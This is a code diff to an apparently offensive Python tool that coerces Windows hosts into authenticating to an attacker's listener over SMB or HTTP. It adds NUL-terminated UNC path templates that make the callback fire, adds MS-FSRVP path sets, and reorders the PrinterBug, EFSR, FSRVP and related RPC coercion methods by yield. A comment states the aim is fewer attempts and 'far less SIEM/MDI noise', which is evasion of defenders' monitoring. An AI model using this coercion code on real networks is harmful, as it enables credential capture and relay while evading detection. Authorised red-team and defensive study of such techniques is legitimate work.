@@ -25,23 +25,37 @@ _BAD_NETPATH_MARKERS = (
     "server_unavailable",
 )
 
+# Every SMB/HTTP coercion template ends in a literal NUL (``{nul}`` -> ``\x00``),
+# mirroring Coercer's COERCE-mode ``exploit_paths``. The trailing NUL is
+# load-bearing: many EFSR/DFSNM/RPRN UNC parsers treat it as the path-string
+# terminator and only then perform the netpath lookup that triggers the
+# outbound authentication. Without it the target parses the path differently
+# and returns ACCESS_DENIED without ever calling back. MS-EVEN's ``\??\UNC\..\aa``
+# form is the documented exception and intentionally carries no NUL.
 _EFSR_PATHS = (
-    ("smb", r"\\{listener}{listen_port}\{rnd:8}\file.txt"),
-    ("smb", r"\\{listener}{listen_port}\{rnd:8}\\"),
-    ("smb", r"\\{listener}{listen_port}\{rnd:8}"),
-    ("http", r"\\{listener}{listen_port}/{rnd:3}\share\file.txt"),
+    ("smb", r"\\{listener}{listen_port}\{rnd:8}\file.txt{nul}"),
+    ("smb", r"\\{listener}{listen_port}\{rnd:8}\\{nul}"),
+    ("smb", r"\\{listener}{listen_port}\{rnd:8}{nul}"),
+    ("http", r"\\{listener}{listen_port}/{rnd:3}\share\file.txt{nul}"),
 )
 
 _GENERIC_UNC_PATHS = (
-    ("smb", r"\\{listener}{listen_port}\{rnd:8}\file.txt"),
-    ("smb", r"\\{listener}{listen_port}\{rnd:8}\\"),
-    ("smb", r"\\{listener}{listen_port}\{rnd:8}"),
-    ("http", r"\\{listener}{listen_port}/{rnd:3}\share\file.txt"),
+    ("smb", r"\\{listener}{listen_port}\{rnd:8}\file.txt{nul}"),
+    ("smb", r"\\{listener}{listen_port}\{rnd:8}\\{nul}"),
+    ("smb", r"\\{listener}{listen_port}\{rnd:8}{nul}"),
+    ("http", r"\\{listener}{listen_port}/{rnd:3}\share\file.txt{nul}"),
 )
 
+# MS-RPRN / MS-FSRVP coerce on a bare ``\\{listener}`` UNC (coercer's
+# ``exploit_paths`` form), not the EFSR ``\{rnd}\file.txt`` shape.
 _RPRN_PATHS = (
-    ("smb", r"\\{listener}\\"),
-    ("http", r"\\{listener}{listen_port}/{rnd:3}"),
+    ("smb", r"\\{listener}{nul}"),
+    ("http", r"\\{listener}{listen_port}/{rnd:3}{nul}"),
+)
+
+_FSRVP_PATHS = (
+    ("smb", r"\\{listener}{nul}"),
+    ("http", r"\\{listener}{listen_port}/{rnd:3}{nul}"),
 )
 
 
@@ -133,13 +147,68 @@ def default_coercion_methods() -> tuple[CoercionMethod, ...]:
     RPC protocols that broaden coverage for workstation/server targets.
     """
 
+    # Order mirrors Coercer's effectiveness ranking: lead with MS-RPRN
+    # (PrinterBug) and MS-FSRVP (bare ``\\{listener}`` UNC, the highest-yield
+    # vectors), then the most effective MS-EFSR calls (OpenFileRaw,
+    # AddUsersToFile, AddUsersToFileEx) before the remaining EFSR surface, then
+    # MS-EVEN and MS-DFSNM. Leading with the effective methods means a capture
+    # lands within the first handful of attempts instead of after exhausting the
+    # whole catalog — fewer triggers, far less SIEM/MDI noise.
     return (
+        _method(
+            "RpcRemoteFindFirstPrinterChangeNotificationEx",
+            "RPRN",
+            65,
+            _RPRN_PATHS,
+            _rprn_call("hRpcRemoteFindFirstPrinterChangeNotificationEx"),
+            ("rpc_s_access_denied", "server_unavailable"),
+        ),
+        _method(
+            "RpcRemoteFindFirstPrinterChangeNotification",
+            "RPRN",
+            62,
+            _RPRN_PATHS,
+            _rprn_call("hRpcRemoteFindFirstPrinterChangeNotification"),
+            ("rpc_s_access_denied", "server_unavailable"),
+        ),
+        _method(
+            "IsPathSupported",
+            "FSRVP",
+            8,
+            _FSRVP_PATHS,
+            _call("hRpcIsPathSupported"),
+            (),
+        ),
+        _method(
+            "IsPathShadowCopied",
+            "FSRVP",
+            9,
+            _FSRVP_PATHS,
+            _call("hRpcIsPathShadowCopied"),
+            (),
+        ),
         _method(
             "EfsRpcOpenFileRaw",
             "EFSR",
             0,
             _EFSR_PATHS,
             _call("hRpcEfsRpcOpenFileRaw"),
+            _BAD_NETPATH_MARKERS,
+        ),
+        _method(
+            "EfsRpcAddUsersToFile",
+            "EFSR",
+            9,
+            _EFSR_PATHS,
+            _call("hRpcEfsRpcAddUsersToFile"),
+            _BAD_NETPATH_MARKERS,
+        ),
+        _method(
+            "EfsRpcAddUsersToFileEx",
+            "EFSR",
+            15,
+            _EFSR_PATHS,
+            _call("hRpcEfsRpcAddUsersToFileEx"),
             _BAD_NETPATH_MARKERS,
         ),
         _method(
@@ -183,14 +252,6 @@ def default_coercion_methods() -> tuple[CoercionMethod, ...]:
             _BAD_NETPATH_MARKERS,
         ),
         _method(
-            "EfsRpcAddUsersToFile",
-            "EFSR",
-            9,
-            _EFSR_PATHS,
-            _call("hRpcEfsRpcAddUsersToFile"),
-            _BAD_NETPATH_MARKERS,
-        ),
-        _method(
             "EfsRpcFileKeyInfo",
             "EFSR",
             12,
@@ -205,46 +266,6 @@ def default_coercion_methods() -> tuple[CoercionMethod, ...]:
             _EFSR_PATHS,
             _call("hRpcEfsRpcDuplicateEncryptionInfoFile", duplicate_path=True),
             _BAD_NETPATH_MARKERS,
-        ),
-        _method(
-            "EfsRpcAddUsersToFileEx",
-            "EFSR",
-            15,
-            _EFSR_PATHS,
-            _call("hRpcEfsRpcAddUsersToFileEx"),
-            _BAD_NETPATH_MARKERS,
-        ),
-        _method(
-            "RpcRemoteFindFirstPrinterChangeNotificationEx",
-            "RPRN",
-            65,
-            _RPRN_PATHS,
-            _rprn_call("hRpcRemoteFindFirstPrinterChangeNotificationEx"),
-            ("rpc_s_access_denied", "server_unavailable"),
-        ),
-        _method(
-            "RpcRemoteFindFirstPrinterChangeNotification",
-            "RPRN",
-            62,
-            _RPRN_PATHS,
-            _rprn_call("hRpcRemoteFindFirstPrinterChangeNotification"),
-            ("rpc_s_access_denied", "server_unavailable"),
-        ),
-        _method(
-            "IsPathSupported",
-            "FSRVP",
-            8,
-            _GENERIC_UNC_PATHS,
-            _call("hRpcIsPathSupported"),
-            (),
-        ),
-        _method(
-            "IsPathShadowCopied",
-            "FSRVP",
-            9,
-            _GENERIC_UNC_PATHS,
-            _call("hRpcIsPathShadowCopied"),
-            (),
         ),
         _method(
             "ElfrOpenBELW",
